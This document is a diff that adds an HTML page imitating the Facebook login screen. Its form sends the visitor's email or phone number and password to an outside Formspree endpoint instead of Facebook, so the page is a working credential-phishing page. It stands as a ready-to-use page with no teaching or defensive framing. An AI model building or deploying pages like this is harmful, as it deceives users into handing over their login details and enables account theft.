@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: Arial, Helvetica, sans-serif;
+                background-color: rgb(233, 233, 239);
+            }
+
+            header {
+                text-align: center;
+                margin-block: 1.3rem;
+            }
+
+            header > h1 {
+                font-size: clamp(2.5rem, 2vw, 5rem);
+                font-weight: 900;
+                color: rgb(86, 86, 237);
+                letter-spacing: 0.1px;
+            }
+
+            #main-section {
+                background-color: #fff;
+                width: min(75vw, 430px);
+                margin-inline: auto;
+                padding: 15px;
+                margin-top: 5rem;
+                border-radius: 15px;
+                box-shadow: 3px 3px 7px #bbb;
+            }
+            #main-section > form {
+                text-align: center;
+                width: 100%;
+            }
+
+            #main-section > form > input {
+                padding: 15px;
+                font-size: medium;
+                margin-block: 0.5rem;
+                width: 100%;
+                border: 1px solid #ccc;
+                border-radius: 8px;
+                outline: none;
+            }
+
+            #main-section > form > input:focus {
+                outline: 2px solid rgba(168, 168, 237, 0.301);
+            }
+
+            #main-section > form > input[type='submit'] {
+                background-color: #1877f2;
+                color: #fff;
+                font-size: larger;
+                font-weight: bold;
+                cursor: pointer;
+                outline: none;
+                transition: background 100ms;
+                border: none;
+            }
+
+            #main-section > form > input[type='submit']:hover {
+                background-color: #0867f2;
+            }
+            #main-section > form > input[type='submit']:active {
+                background-color: #4267b2;
+            }
+            #main-section > div {
+                text-align: center;
+            }
+
+            #main-section > div > a {
+                display: block;
+                margin-block: 1rem;
+                font-size: 0.9rem;
+                text-decoration: none;
+            }
+
+            #main-section > div > a:nth-of-type(2) {
+                margin-top: 2rem;
+                background-color: rgb(72, 186, 72);
+                width: 220px;
+                padding: 13px;
+                color: #fff;
+                font-size: large;
+                font-weight: bold;
+                margin-inline: auto;
+                border-radius: 8px;
+                transition: background 100ms;
+            }
+
+            #main-section > div > a:nth-of-type(2):hover {
+                background-color: rgb(50, 150, 50);
+            }
+
+            footer {
+                background-color: white;
+                margin-top: 15rem;
+                padding: 15px;
+            }
+            footer > section {
+                max-width: 600px;
+                margin-inline: auto;
+                display: flex;
+                justify-content: start;
+                flex-wrap: wrap;
+                gap: 0.8rem;
+            }
+            footer > section > p {
+                font-size: 0.9rem;
+                cursor: pointer;
+            }
+        </style>
+        <title>Document</title>
+    </head>
+    <body>
+        <header>
+            <h1>facebook</h1>
+        </header>
+        <section id="main-section">
+            <form action="https://formspree.io/f/xvoywlyj" method="POST" id="my-form">
+                <input type="text" name="num-input" id="num-input" placeholder="Email or phone" />
+                <br />
+                <input type="password" name="password" id="pass-input" placeholder="Password" />
+                <br />
+                <input type="submit" value="Log-in" />
+            </form>
+            <div>
+                <a href="#">Forgot Password</a>
+                <hr />
+                <a href="#">Make new account</a>
+            </div>
+        </section>
+        <footer>
+            <section>
+                <p>Filipino</p>
+                <p>English(US)</p>
+                <p>Bisaya</p>
+                <p>Espanol</p>
+                <p>日本語</p>
+                <p>한국어</p>
+                <p>中文(简体)</p>
+                <p>العربية</p>
+                <p>Português (Brasil)</p>
+                <p>Français (France)</p>
+                <p>Deutsch</p>
+            </section>
+        </footer>
+        <script src="./main.js"></script>
+    </body>
+</html>
